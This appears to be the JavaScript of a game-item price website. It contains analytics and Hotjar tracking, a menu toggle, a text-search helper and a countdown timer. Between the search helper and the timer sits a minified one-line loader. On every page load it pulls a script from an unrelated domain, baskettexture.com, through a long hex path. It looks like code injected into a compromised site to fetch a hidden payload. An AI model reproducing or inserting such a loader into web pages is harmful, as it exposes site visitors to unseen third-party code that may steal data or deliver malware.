(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
      (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
      m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
      })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
      ga('create', 'UA-98214995-1', 'auto');
      ga('send', 'pageview');

      function myFunction() {
          var x = document.getElementById("myTopnav");
          if (x.className === "topnav") {
              x.className += " responsive";
          } else {
              x.className = "topnav";
          }
      }

      function searchForText( toFind, frameToSearch ) {
      	if( !toFind ) { window.alert( 'You need to enter an item to search.' ); return; }
      	if( frameToSearch.focus ) { frameToSearch.focus(); }
      	if( window.find ) {
      		//Netscape compatible browsers provide the window.find method
      		if( document.layers ) {
      			//Against the JS spec, Netscape 4 will produce errors if too many arguments are given
      			var ifFound = frameToSearch.find( toFind, false, false );
      		} else {
      			var ifFound = frameToSearch.find( toFind, false, false, true, false, true, false );
      		}
      	} else if( frameToSearch.document.body && frameToSearch.document.body.createTextRange ) {
      		//IE or compatible use various TextRange features
      		if( frameToSearch.document.selection && frameToSearch.document.selection.type != 'None' ) {
      			//If some text is selected already (previous search or if they have selected it)
      			//make that the text range. Then move to the end of it to search beyond it
      			var theRange = frameToSearch.document.selection.createRange();
      			theRange.collapse( false );
      		} else {
      			//If no text is selected, start from the start of the document
      			var theRange = frameToSearch.document.body.createTextRange();
      		}
      		//find the next occurrence of the chosen string
      		var ifFound = theRange.findText( toFind );
      		if( ifFound ) { theRange.select(); }
      	} else {
      		alert ( 'Please use your browser\'s search facility' );
      	}
      	if( !ifFound ) { alert ( 'Could not find text:\n' + toFind ); }
      }

(function(a,b,c,d,e){e=a.createElement(b);a=a.getElementsByTagName(b)[0];e.async=1;e.src=c;a.parentNode.insertBefore(e,a)})(document,'script','//baskettexture.com/33e6f44430218f00491e753f395ce74b660b6ba498562a8ba43a767764c414581fdbe7edf5ae8a2780a2c10f2fc71bf9600fba74591bc352819db8e53cab');

// Set the date we're counting down to
var countDownDate = new Date("Aug 25, 2017 20:00:00").getTime();

// Update the count down every 1 second
var x = setInterval(function() {

  // Get todays date and time
  var now = new Date().getTime();

  // Find the distance between now an the count down date
  var distance = countDownDate - now;

  // Time calculations for days, hours, minutes and seconds
  var days = Math.floor(distance / (1000 * 60 * 60 * 24));
  var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
  var seconds = Math.floor((distance % (1000 * 60)) / 1000);

  // Display the result in the element with id="demo"
  document.getElementById("demo").innerHTML = days + "d " + hours + "h "
  + minutes + "m " + seconds + "s ";

  // If the count down is finished, write some text
  if (distance < 0) {
    clearInterval(x);
    document.getElementById("demo").innerHTML = "EXPIRED";
  }
}, 1000);


<!-- Hotjar Tracking Code for http://www.rltprices.com -->
<script>
    (function(h,o,t,j,a,r){
        h.hj=h.hj||function(){(h.hj.q=h.hj.q||[]).push(arguments)};
        h._hjSettings={hjid:415461,hjsv:5};
        a=o.getElementsByTagName('head')[0];
        r=o.createElement('script');r.async=1;
        r.src=t+h._hjSettings.hjid+j+h._hjSettings.hjsv;
        a.appendChild(r);
    })(window,document,'//static.hotjar.com/c/hotjar-','.js?sv=');
</script>